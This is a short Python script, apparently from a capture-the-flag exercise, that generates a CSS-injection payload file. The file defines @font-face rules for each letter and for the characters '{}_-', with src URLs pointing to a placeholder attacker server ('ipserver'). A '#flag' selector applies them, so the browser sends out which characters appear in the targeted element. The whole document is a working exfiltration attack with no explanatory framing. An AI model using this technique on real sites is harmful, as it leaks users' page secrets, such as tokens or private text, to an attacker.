
set = '{}_-'
s = """
@font-face{
    font-family:'%s';
    src:url('http://%s/?found:%s');
    unicode-range:U+%04x;
}
"""

s2 = """
#flag{
    font-family:"""

ipserver = "ipserver"
with open("injection.css",'wb') as f:
    for i in range(65,91):
        s2+="'%s',"%chr(i)
        f.write(s%(chr(i),ipserver,chr(i),i))
    for i in range(97,123):
        s2+="'%s',"%chr(i)
        f.write(s%(chr(i),ipserver,chr(i),i))
    for i in set:
        s2+="'%s',"%i
        f.write(s%(i,ipserver,i,ord(i)))
    s2 = s2[:-1]
    s2 += "\n}\n"
    f.write(s2)
    
